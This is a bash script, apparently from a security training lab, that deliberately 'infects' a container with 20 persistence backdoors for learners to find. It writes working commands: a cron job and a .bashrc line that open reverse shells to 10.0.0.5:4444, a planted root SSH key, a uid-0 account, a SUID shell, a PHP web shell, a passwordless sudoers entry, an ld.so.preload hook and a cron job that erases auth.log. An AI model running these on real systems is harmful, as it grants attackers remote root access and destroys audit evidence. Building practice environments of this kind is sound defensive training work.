#!/bin/bash
# SIERN Lab - Vulnerability Infection Script
# This script "compromises" the container with 20 persistence mechanisms.

echo "[*] Infecting system with security vulnerabilities..."

# 1. SSH Key Backdoor
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2E...admin@compromise" >> /root/.ssh/authorized_keys

# 2. Reverse Shell Cron
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'" > /etc/cron.d/rev_shell

# 3. Rogue Root User
echo "sysadmin_backup:x:0:0:System Admin Backup:/root:/bin/bash" >> /etc/passwd

# 4. SUID Binary
cp /bin/sh /usr/local/bin/.sys_check
chmod u+s /usr/local/bin/.sys_check

# 5. systemd Service (Mocked file since Docker doesn't use systemd by default)
touch /etc/systemd/system/dbus-org.freedesktop.network1.service

# 6. Bashrc Injection
echo 'echo "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" >> /root/.bashrc' >> /root/.bashrc

# 7. SSH Config Hardening Bypass (Already in Dockerfile, but adding comment for audit)
echo "# PermitRootLogin yes # system_update" >> /etc/ssh/sshd_config

# 8. systemd Timer (Mocked)
touch /etc/systemd/system/system-update.timer

# 9. LD_PRELOAD
touch /usr/local/lib/libhidden.so
echo "/usr/local/lib/libhidden.so" > /etc/ld.so.preload

# 10. MOTD Backdoor
mkdir -p /etc/update-motd.d/
echo "#!/bin/bash\necho 'Compromised!'" > /etc/update-motd.d/99-backdoor
chmod +x /etc/update-motd.d/99-backdoor

# 11. Sudoers Entry
echo "www-data ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/web-admin

# 12. Binary Hijacking
touch /usr/local/bin/ls
echo "#!/bin/bash\n/bin/ls \$@" > /usr/local/bin/ls
chmod +x /usr/local/bin/ls

# 13. Immutable File (Mocked as the attribute might not work in all Docker storage drivers)
touch /root/.backdoor-persistent

# 14. Legacy Init.d
echo "#!/bin/bash\n# Malicious Init Script" > /etc/init.d/sys_update
chmod +x /etc/init.d/sys_update

# 15. Path Hijack
echo 'export PATH="/tmp:$PATH"' >> /root/.profile

# 16. At Job (Mocked)
mkdir -p /var/spool/cron/atjobs/

# 17. Kernel Module (Mocked)
echo "backdoor_module" >> /etc/modules

# 18. Web Shell
echo "<?php system(\$_GET['cmd']); ?>" > /var/www/html/shell.php

# 19. Log Eraser
echo "0 0 * * * root rm -rf /var/log/auth.log" >> /etc/crontab

# 20. SSHD Port Forwarding
echo "AllowTcpForwarding yes" >> /etc/ssh/sshd_config

echo "[+] Infection complete. 20 threats active."
